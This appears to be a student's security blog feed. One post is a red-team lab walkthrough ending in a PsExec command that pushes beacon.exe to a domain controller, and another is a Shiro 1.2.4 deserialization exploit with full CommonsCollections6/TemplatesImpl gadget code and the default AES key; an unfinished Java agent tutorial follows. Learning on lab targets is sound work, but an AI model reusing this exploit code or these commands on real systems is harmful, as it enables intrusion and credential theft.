<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>小叹</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2021-07-29T03:55:35.954Z</updated>
  <id>http://yoursite.com/</id>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ATT&amp;CK红队评估实战靶场（一） 练习</title>
    <link href="http://yoursite.com/2021/07/24/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89%20%E7%BB%83%E4%B9%A0/"/>
    <id>http://yoursite.com/2021/07/24/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89%20%E7%BB%83%E4%B9%A0/</id>
    <published>2021-07-24T11:31:01.000Z</published>
    <updated>2021-07-29T03:55:35.954Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ATT-amp-CK红队评估实战靶场（一）-练习"><a href="#ATT-amp-CK红队评估实战靶场（一）-练习" class="headerlink" title="ATT&amp;CK红队评估实战靶场（一） 练习"></a>ATT&amp;CK红队评估实战靶场（一） 练习</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>已经一个月没有写东西啦，因为期末考试加上自己的项目还有考完还有学校的课程内容一直蛮忙的，一直到16号才放假，上个星期还去安恒实习了，就打算乘着双休搭建一个靶机，想学内网好久了，一直都没有上手操作，这边实际上操作一遍，但是下面的内容还是很蠢的也没有什么值得学习的操作，纯粹是我第一次上手进行内网学习的记录。</p><h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>首先使用nmap进行扫描，使用的命令如下：</p><blockquote><p>nmap -sP 192.168.1.0/24</p></blockquote><p>对192.168.1.0网段进行扫描使用的参数说-sP，使用的是ICMP协议发送echo包来探测的，但是这样不能扫描出禁ping的主机所以要注意一下。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsrxe4ailgj30pm0js0us.jpg" alt=""></p><p>这里可以看见靶机的IP是192.168.1.130，我们继续用nmap扫描一下具体的服务</p><blockquote><p>namp -sV 192.168.1.130</p></blockquote><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsrzqf7tybj30py0k8tcs.jpg" alt=""><br>可以看见开放啦80端口和3306端口先访问看看。<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gsrzxwhlipj615b0u0n5r02.jpg" alt=""><br>使用dirsearch爆破一下，发现了phpmyadmin，随手检测一波弱口令就进去啦（因为是靶机的缘故hh）<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss0891arzj30qu09qdhp.jpg" alt=""><br>去看看数据库日志文件的位置，很基础的操作写入shell，没什么好说的。<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss0d4lcogj31l60qwn1p.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss0ipwf22j31ii036mxe.jpg" alt=""></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss12q5wcpj30x40h4q5n.jpg" alt=""><br>通过日志文件写入shell，然后使用蚁剑进行连接。然后进入蚁剑的虚拟终端</p><blockquote><p>whoami #查看当前用户<br>tasklist /svc # 查看当前进程</p></blockquote><p>并去查看是否存在杀软，不存在直接用cs上线。<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss1kxh79qj31aa0u0aeq.jpg" alt=""></p><p>在cs生成后门文件直接上传，然后进行执行。<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss3yrkyvgj319w0e2t9u.jpg" alt=""><br>进入beacon首先观看一下网卡信息，获得信息如下：<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss43vt7w1j324r0u0ajw.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss4snja48j317u0fmmyx.jpg" alt=""></p><pre><code>win7具有双网卡：      外网：192.168.1.130    内网：192.168.52.143    域：god.org    DNS:192.168.52.138    域内还有两台机器141和138（域控）    只存在一个域GOD</code></pre><p>查看一下域成员<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss5dnjnrzj30nm0euabc.jpg" alt=""></p><p>这里直接使用cs自带的进行提权<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss63afe8ej30u00xpq6x.jpg" alt=""><br>然后直接抓取密码<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss67vdy1aj31vc0s444a.jpg" alt=""><br>这边因为是外网要端口转发到内网端口<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss881yfmhj30su0b2dgm.jpg" alt=""><br>然后进行jump<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss8bw24a9j30v60gqdij.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss84tgruhj31kg0ssth6.jpg" alt=""><br>成功获得一个域内主机<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss8cbt0i0j324q05m0tw.jpg" alt=""><br>这边成功抓取到了Adminstartor的密码和hash，之后可以通过Psexec进行PTH，但是目标主机是内网不能出网，那么我们需要进行中转上线。</p><p>Psexec原理：</p><ul><li>开启admin$</li><li>445端口共享<br>通过ipc$连接，然后释放psexesvc.exe到目标激情。通过服务管理远程创建psexecsvc服务，并启动。</li></ul><p>缺点：目标系统会有一个配色邪恶吃的服务，在windows日志里可以溯源到IP。<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss6dknn8ej313c0d6766.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss6jijq8nj30u4052t9d.jpg" alt=""><br>然后生成一个木马进行中转上线</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss6ine8xdj30l60d83zp.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss6kf8nrwj30pw0giwgd.jpg" alt=""><br>把生成的beacon.exe上传到目标机器，然后再把psexec一起上传<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss7b46v9nj31pw0ngte4.jpg" alt=""></p><blockquote><p>shell C:\PsExec64.exe -accepteula \192.168.52.138 -u GOD\Administrator -p god.org -d -c C:\beacon.exe</p></blockquote><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss90dkwhgj327a0p0aik.jpg" alt=""><br>但是这边我失败了，并没有中转成功，不过我直接用cs的插件成功啦。<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss946n8dnj31cg06gwfy.jpg" alt=""><br>成功上线后抓取域内的密码和hash<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss93egn95j32800mi121.jpg" alt=""></p><p>至此结束了，下面是拓扑<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gss9j10olvj314a0hygoh.jpg" alt=""></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次对靶机的学习其实还有很多知识点没有尝试但是因为第一次上手操作磕磕碰碰的耗费了太久的时间就先到这边结束了。也希望我能撑这个暑假学到足够多的知识，在实习中也能有所提高。</p>]]></content>
    
    <summary type="html">
    
      内网
    
    </summary>
    
    
      <category term="内网" scheme="http://yoursite.com/categories/%E5%86%85%E7%BD%91/"/>
    
    
      <category term="内网" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91/"/>
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
  </entry>
  
  <entry>
    <title>Shiro反序列化漏洞学习</title>
    <link href="http://yoursite.com/2021/06/13/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2021/06/13/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-06-13T11:16:01.000Z</published>
    <updated>2021-07-29T05:50:53.949Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Shiro反序列化漏洞学习"><a href="#Shiro反序列化漏洞学习" class="headerlink" title="Shiro反序列化漏洞学习"></a>Shiro反序列化漏洞学习</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近临近期末，事情变得很多，到了大二后感觉事情明显变多了，感觉人也很累，已经很久没有更新文章了，记得刚刚开始写博客是大一的时候，刚刚开始写博客也只是瞎搞，慢慢的开始注意到自己不能继续下去，于是就删除了以前的文章。尽管现在的文章质量也还是很低，但是希望自己能够慢慢进步。最近不仅要忙期末考试的事情、还要写项目，开始写项目发现自己的代码功底还是很弱，希望能在大三中改善这点。</p><h2 id="shiro简介"><a href="#shiro简介" class="headerlink" title="shiro简介"></a>shiro简介</h2><p>简而言之，Apache Shiro 是一个强大灵活的开源安全框架，可以完全处理身份验证、授权、加密和会话管理。</p><p>Shiro能到底能做些什么呢？</p><ul><li>验证用户身份</li><li>用户访问权限控制，比如：1、判断用户是否分配了一定的安全角色。2、判断用户是否被授予完成某个操作的权限</li><li>在非 Web 或 EJB 容器的环境下可以任意使用Session API</li><li>可以响应认证、访问控制，或者 Session 生命周期中发生的事件</li><li>可将一个或以上用户安全数据源数据组合成一个复合的用户 “view”(视图)</li><li>支持单点登录(SSO)功能</li><li>支持提供“Remember Me”服务，获取用户关联信息而无需登录</li></ul><p>具体的就自己去了解吧。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>这里用的是<a href="https://github.com/phith0n/JavaThings/tree/master/shirodemo/">p牛的代码</a>,其实刚刚开始打算自己写的，但是弄了好久都一直有一个报错，看了看版本，网上的资料，也没找到原因,报错如下。最后用p牛的代码先学一下，希望以后能够解决这个问题。</p><pre><code>Caused by: java.lang.ClassNotFoundException: Unable to load ObjectStreamClass [org.apache.commons.collections.keyvalue.TiedMapEntry: static final long serialVersionUID = -8453869361373831205L;]:     at org.apache.shiro.io.ClassResolvingObjectInputStream.resolveClass(ClassResolvingObjectInputStream.java:55) ~[shiro-core-1.2.4.jar:1.2.4]    at java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:1984) ~[na:1.8.0_281]    at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1848) ~[na:1.8.0_281]    at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2158) ~[na:1.8.0_281]    at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1665) ~[na:1.8.0_281]    at java.io.ObjectInputStream.readObject(ObjectInputStream.java:501) ~[na:1.8.0_281]    at java.io.ObjectInputStream.readObject(ObjectInputStream.java:459) ~[na:1.8.0_281]    at java.util.HashMap.readObject(HashMap.java:1410) ~[na:1.8.0_281]    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_281]    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_281]    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_281]    at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_281]    at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1185) ~[na:1.8.0_281]    at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2294) ~[na:1.8.0_281]    at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2185) ~[na:1.8.0_281]    at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1665) ~[na:1.8.0_281]    at java.io.ObjectInputStream.readObject(ObjectInputStream.java:501) ~[na:1.8.0_281]    at java.io.ObjectInputStream.readObject(ObjectInputStream.java:459) ~[na:1.8.0_281]    at org.apache.shiro.io.DefaultSerializer.deserialize(DefaultSerializer.java:77) ~[shiro-core-1.2.4.jar:1.2.4]    ... 28 common frames omittedCaused by: org.apache.shiro.util.UnknownClassException: Unable to load class named [org.apache.commons.collections.keyvalue.TiedMapEntry] from the thread context, current, or system/application ClassLoaders.  All heuristics have been exhausted.  Class could not be found.    at org.apache.shiro.util.ClassUtils.forName(ClassUtils.java:148) ~[shiro-core-1.2.4.jar:1.2.4]    at org.apache.shiro.io.ClassResolvingObjectInputStream.resolveClass(ClassResolvingObjectInputStream.java:53) ~[shiro-core-1.2.4.jar:1.2.4]    ... 46 common frames omitted</code></pre><h2 id="CommonCollection6"><a href="#CommonCollection6" class="headerlink" title="CommonCollection6"></a>CommonCollection6</h2><p>这里用的是cc6的原因也是因为看了p牛的文章，想自己脱离文章试一下。</p><p>先改写一下cc6生成payload,cc6.java改的很简单只是使原来的方法改写成返回字节数组的函数，然后再编写一个test.java将返回的字节码利用shiro 1.2.4内置的密钥进行加密，生成命令执行的rememberMe。</p><h3 id="cc6-java"><a href="#cc6-java" class="headerlink" title="cc6.java"></a>cc6.java</h3><pre><code class="java">import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import java.util.HashSet;import java.util.Map;public class cc6 &#123;    public byte[] getPayload(String command) throws Exception &#123;        Transformer Testtransformer = new ChainedTransformer(new Transformer[]&#123;&#125;);        Transformer[] transformers=new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,new Class[]&#123;&#125;&#125;),                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,new Object[]&#123;&#125;&#125;),                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc.exe &quot;&#125;)        &#125;;        Map map=new HashMap();        Map lazyMap=LazyMap.decorate(map,Testtransformer);        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,&quot;test1&quot;);        HashSet hashSet=new HashSet(1);        hashSet.add(tiedMapEntry);        lazyMap.remove(&quot;test1&quot;);        //通过反射覆盖原本的iTransformers，防止序列化时在本地执行命令        Field field = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;);        field.setAccessible(true);        field.set(Testtransformer, transformers);//        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;test.out&quot;));//        objectOutputStream.writeObject(hashSet);//        objectOutputStream.close();////        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(&quot;test.out&quot;));//        objectInputStream.readObject();        ByteArrayOutputStream stream = new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream = new ObjectOutputStream(stream);        objectOutputStream.writeObject(hashSet);        objectOutputStream.close();        return stream.toByteArray();    &#125;&#125;</code></pre><h3 id="test-java"><a href="#test-java" class="headerlink" title="test.java"></a>test.java</h3><pre><code class="java">import org.apache.shiro.crypto.AesCipherService;import org.apache.shiro.util.ByteSource;public class test &#123;    public static void main(String[] args) throws Exception &#123;        byte[] payload = new cc6().getPayload(&quot;calc.exe&quot;);        AesCipherService aes = new AesCipherService();        byte[] key = java.util.Base64.getDecoder().decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);        ByteSource ciphertext = aes.encrypt(payload, key);        System.out.printf(ciphertext.toString());    &#125;&#125;</code></pre><p>将生成的rememberMe去访问login.jsp的页面，如图：</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grfp5mdurzj30od0k5wj5.jpg" alt=""></p><p>但是并没有弹出计算器，查看idea的报错：</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grfp7qh1s8j318v09874s.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008i3skNly1grfp7vcb17j318s034weg.jpg" alt=""></p><p>我们查看一下报错的内容，好像是和类没有加载成功有关[Lorg.apache.commons.collections.Transformer;，而这个类就是我们cc6里面用到的Transformer，但是为什么会报错呢，还有这个最前面多余的[L是什么意思？</p><p>我们先来回答第二个问题，这个符号表示的是这是一个数组，即Transformer[]。那么为什么这个类无法加载呢？我们debug进去看一下。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grfpoiwtn6j312s073q3v.jpg" alt=""></p><p>可以看见这里重写了resolve方法，我们先比较一下与原来有什么不同</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grfpvb0lvlj31bh0n4gmm.jpg" alt=""></p><p>在ClassResolvingObjectInputStream.resolveClass中，不同之处就在与父类使用的是Class.forname()而在后者使用的则是org.apache.shiro.util.ClassUtils.forname(),为了知道有什么具体的不同我们跟进进行观察。</p><p>进入ClassUtils.forname()后我们可以发现其实内部调用的是Class.loadClass()这个方法。<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1grfpz8uczjj30uh0djmyy.jpg" alt=""></p><p>在一般情况下Class.forname和Class.loadClass()的效果是相同的，但是loadClass的方法不能加载数组，继续往loadClass里面跟进会调用Class.forName,再继续追就是双亲委派了。</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1grfqjp3xhbj30uh0djmyy.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008i3skNly1grfqju3vz0j30jo06emxq.jpg" alt=""></p><p>在整体流程里面，WebappsClassLoader会先寻找内部缓存，寻找类，找不到交给URLClasssLoader但是寻找的却是/[Lorg而不是/org打头所以没有找到。</p><p>那么现在找到了原因，cc6中不能使用数组，可是不能使用Transformer的数组岂不是凉了吗，可是p牛还是相处了解决方案。而这个解决方案为之前的fastjson的文章也利用到过，就是使用TemplatesImpl来执行命令。</p><h2 id="修改cc6利用链"><a href="#修改cc6利用链" class="headerlink" title="修改cc6利用链"></a>修改cc6利用链</h2><p>接下来我们先写一个TemplatesImpl：</p><blockquote><p>TemplatesImpl templates = new TemplatesImpl();<br>            setvalue(templates, “_bytecodes”, new byte[][]{clazzBytes});<br>            setvalue(templates, “_name”, “HelloTemplatesImpl”);<br>            setvalue(templates, “_tfactory”, new TransformerFactoryImpl());</p></blockquote><p>这个我们之前<a href="https://www.yuque.com/pyshare-xiaotan/gc6e3o/tbmrhp#dlHvI">fastjson</a>的时候有写到过。</p><pre><code class="java">public static byte[] generateEvil() throws Exception &#123;        ClassPool pool = ClassPool.getDefault();        CtClass clas = pool.makeClass(&quot;Evil&quot;);        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));        String cmd = &quot;Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;;        clas.makeClassInitializer().insertBefore(cmd);        clas.setSuperclass(pool.getCtClass(AbstractTranslet.class.getName()));        clas.writeFile(&quot;./&quot;);        byte[] bytes = clas.toBytecode();        return bytes;    &#125;        public static void main(String[] args) throws Exception &#123;            byte[] clazzBytes = generateEvil();            TemplatesImpl templates = new TemplatesImpl();            setvalue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;clazzBytes&#125;);            setvalue(templates, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);            setvalue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());            templates.newTransformer();        &#125;    public static void setvalue(Object obj, String fieldName, Object value) throws Exception &#123;        Field field = obj.getClass().getDeclaredField(fieldName);        field.setAccessible(true);        field.set(obj,value);    &#125;</code></pre><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grgkukjfatj31c10u016f.jpg" alt=""></p><p>确实可以触发命令执行，那我们在转回去结合cc6看看，如何结合起来。</p><blockquote><p>Transformer[] transformer = new Transformer[]{<br>                new ConstantTransformer(templates),<br>                    new InvokerTransformer(“newTransformer”, null,null)<br>            };</p></blockquote><p>这里的ConstantTransformer会返回对象，然后调用nerTransformer方法，实际上就是原来的templates.newTransformer()。但是这里还是用到了数组，我们现在要想办法代替掉这个步骤。</p><p>我们再转回去看看cc6的代码，其中有这段：</p><pre><code> Map map=new HashMap();        Map lazyMap=LazyMap.decorate(map,Testtransformer);        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,&quot;test1&quot;);        HashSet hashSet=new HashSet(1);        hashSet.add(tiedMapEntry);        lazyMap.remove(&quot;test1&quot;);</code></pre><p>在LazyMap#get的方法中存在this.factory.transform(key)的方法，那我们只要控制这里的key为我们设置的templatesImpl，控制this.factory为invokeTransfomer就可以执行命令了。<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grgm6o80ioj30vu0tsamt.jpg" alt=""><br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grgmupoi3sj311406wwfu.jpg" alt=""></p><p>下面接下来的就和cc6一样了，我们控制TideMapEntry中的map为LazyMap就可以了。<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grgmwr006oj311e0sm7ac.jpg" alt=""></p><p>现在利用链已经构造好了，完整代码如下：</p><pre><code>public static byte[] generateEvil() throws Exception &#123;        ClassPool pool = ClassPool.getDefault();        CtClass clas = pool.makeClass(&quot;Evil&quot;);        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));        String cmd = &quot;Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;;        clas.makeClassInitializer().insertBefore(cmd);        clas.setSuperclass(pool.getCtClass(AbstractTranslet.class.getName()));        clas.writeFile(&quot;./&quot;);        byte[] bytes = clas.toBytecode();        return bytes;    &#125;        public static void main(String[] args) throws Exception &#123;            byte[] clazzBytes = generateEvil();            TemplatesImpl templates = new TemplatesImpl();            setvalue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;clazzBytes&#125;);            setvalue(templates, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);            setvalue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());            InvokerTransformer transformer = new InvokerTransformer(&quot;getClass&quot;,null, null);            Map map=new HashMap();            Map lazyMap= LazyMap.decorate(map,transformer);            TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,templates);            HashSet hashSet=new HashSet(1);            hashSet.add(tiedMapEntry);            lazyMap.clear();            setvalue(transformer, &quot;iMethodName&quot;, &quot;newTransformer&quot;);            ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;test.out&quot;));            objectOutputStream.writeObject(hashSet);            objectOutputStream.close();            ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(&quot;test.out&quot;));            objectInputStream.readObject();        &#125;    public static void setvalue(Object obj, String fieldName, Object value) throws Exception &#123;        Field field = obj.getClass().getDeclaredField(fieldName);        field.setAccessible(true);        field.set(obj,value);    &#125;</code></pre><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grgoobc3g6j31kx0u0hdt.jpg" alt=""><br>下面是debug执行命令的具体地方<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grgp36981qj310v0u0dwj.jpg" alt=""><br>但是这里可以注意到cc6原来使用的是remove那为什么我们这里使用的却是clear呢？<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grgomjwdaxj31ce0pogsf.jpg" alt=""></p><p>其实是可以的只是我学太久了，脑子不太灵光了，哈哈。<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grgtukcu7cj30l80a6gpw.jpg" alt=""><br>这样写是可以弹出来的，原来的remove健写错了导致命令执行出现了错误。感兴趣可以自己debug看看。<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grgtvprfz1j31hw0a6dpc.jpg" alt=""></p><p>最后再自己修改一下代码，这里我就不贴了。最后我的环境搭在windows上我mac是m1有点小问题，不过也成功弹出计算器了。<br><img src="https://tva1.sinaimg.cn/large/008i3skNgy1grguew3s6lj313j0ljte8.jpg" alt=""></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这是我第一次脱离文章自己写东西，以前都是一边看一边写的，感觉收获还是蛮大的，临近期末，事情也越来越多，争取每天都能学到新的东西。</p>]]></content>
    
    <summary type="html">
    
      Shiro反序列化漏洞学习
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://yoursite.com/2021/05/09/Java%20agent%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2021/05/09/Java%20agent%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-05-09T01:23:32.913Z</published>
    <updated>2021-07-29T05:50:50.389Z</updated>
    
    <content type="html"><![CDATA[<hr><p>title: Java agent学习<br>author: xiaotan<br>cover: <a href="https://tva1.sinaimg.cn/large/008i3skNly1gqc62dvybnj31ow0syqv6.jpg">https://tva1.sinaimg.cn/large/008i3skNly1gqc62dvybnj31ow0syqv6.jpg</a><br>authorLink: york145.github.io/<br>authorAbout: 一个超菜的人<br>authorDesc: 一个超菜的人<br>categories: 内网<br>date: 2021-05-09 14:31:01<br>comments: true<br>tags: </p><ul><li>Java</li><li>悦读<br>keywords: Java<br>description: Java<br>photos: <a href="https://tva1.sinaimg.cn/large/008i3skNly1gqc62dvybnj31ow0syqv6.jpg">https://tva1.sinaimg.cn/large/008i3skNly1gqc62dvybnj31ow0syqv6.jpg</a></li></ul><hr><h1 id="Java-agent学习"><a href="#Java-agent学习" class="headerlink" title="Java agent学习"></a>Java agent学习</h1><h2 id="JVMTI-（JVM-Tool-Interface）"><a href="#JVMTI-（JVM-Tool-Interface）" class="headerlink" title="JVMTI （JVM Tool Interface）"></a>JVMTI （JVM Tool Interface）</h2><p>JVMTI （JVM Tool Interface）是Java虚拟机对外提供的Native编程接口，通过JVMTI，外部进程可以获取到运行时JVM的诸多信息，比如线程、GC等。Agent是一个运行在目标JVM的特定程序，它的职责是负责从目标JVM中获取数据，然后将数据传递给外部进程。加载Agent的时机可以是目标JVM启动之时，也可以是在目标JVM运行时进行加载，而在目标JVM运行时进行Agent加载具备动态性。</p><h2 id="JVM启动前"><a href="#JVM启动前" class="headerlink" title="JVM启动前"></a>JVM启动前</h2><h3 id="javaagent参数"><a href="#javaagent参数" class="headerlink" title="javaagent参数"></a>javaagent参数</h3><p>javaagent是java命令的一个参数。改参数可指定一个jar包，一条java命令中可多次出现javaagent，对于jar包有下面两个要求：</p><ol><li>这个jar包的MANIFEST.MF文件必须指定Premain-Class项。</li><li>Premain-Class指定的类必须有premain()方法。</li></ol><blockquote><p>premain方法是中JVM启动时先于main函数运行的，JVM启动时会先运行-javaagent指定类的premain方法。</p></blockquote><p>同时javaagent命令要求指定的类必须有premain()，并且对其方法对签名也有要求：</p><pre><code class="java">public static void premain(String agentArgs, Instrumentation inst); public static void premain(String agentArgs);</code></pre><p>JVM会优先价值带Instrumentation签名的方法，加载成功忽略第二种，如果第一种没有，则加载第二种方法。</p><p>Instrumentation类定义如下：</p><pre><code class="java">public interface Instrumentation &#123;    //增加一个Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。    void addTransformer(ClassFileTransformer transformer, boolean canRetransform);    //在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。    void addTransformer(ClassFileTransformer transformer);    //删除一个类转换器    boolean removeTransformer(ClassFileTransformer transformer);    boolean isRetransformClassesSupported();    //在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。    void retransformClasses(Class&lt;?&gt;... classes) throws UnmodifiableClassException;    boolean isRedefineClassesSupported();    void redefineClasses(ClassDefinition... definitions)        throws  ClassNotFoundException, UnmodifiableClassException;    boolean isModifiableClass(Class&lt;?&gt; theClass);    @SuppressWarnings(&quot;rawtypes&quot;)    Class[] getAllLoadedClasses();    @SuppressWarnings(&quot;rawtypes&quot;)    Class[] getInitiatedClasses(ClassLoader loader);    //获取一个对象的大小    long getObjectSize(Object objectToSize);    void appendToBootstrapClassLoaderSearch(JarFile jarfile);    void appendToSystemClassLoaderSearch(JarFile jarfile);    boolean isNativeMethodPrefixSupported();    void setNativeMethodPrefix(ClassFileTransformer transformer, String prefix);&#125;</code></pre><p>使用 javaagent 需要几个步骤：</p><ul><li><p>定义一个 MANIFEST.MF 文件，必须包含 Premain-Class 选项，通常也会加入Can-Redefine-Classes 和 Can-Retransform-Classes 选项。</p></li><li><p>创建一个Premain-Class 指定的类，类中包含 premain 方法，方法逻辑由用户自己确定。</p></li><li><p>将 premain 的类和 MANIFEST.MF 文件打成 jar 包。</p></li><li><p>使用参数 -javaagent: jar包路径 启动要代理的方法。</p><p> 在执行以上步骤后，JVM 会先执行 premain 方法，大部分类加载都会通过该方法，注意：是大部分，不是所有。当然，遗漏的主要是系统类，因为很多系统类先于 agent 执行，而用户类的加载肯定是会被拦截的。也就是说，这个方法是在 main 方法启动前拦截大部分类的加载活动，既然可以拦截类的加载，那么就可以去做重写类这样的操作，结合第三方的字节码编译工具，比如ASM，javassist，cglib等等来改写实现类。</p></li></ul><p>下面我们用IDEA来试验一下，我们先创建一个agent_test的项目<br>在src下创建一个lib文件夹放入javassist.jar包。然后再创建一个org.com在文件夹下创建Agent.java,DefineTransformer.java。<br>Agent.java</p><pre><code class="java">package org.com;import java.lang.instrument.Instrumentation;public class Agent &#123;    public static void premain(String agentArgs, Instrumentation inst) &#123;        inst.addTransformer(new DefineTransformer(), true);    &#125;&#125;</code></pre><p>DefineTransformer.java</p><pre><code class="java">public class DefineTransformer implements ClassFileTransformer&#123;    @Override    public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException &#123;        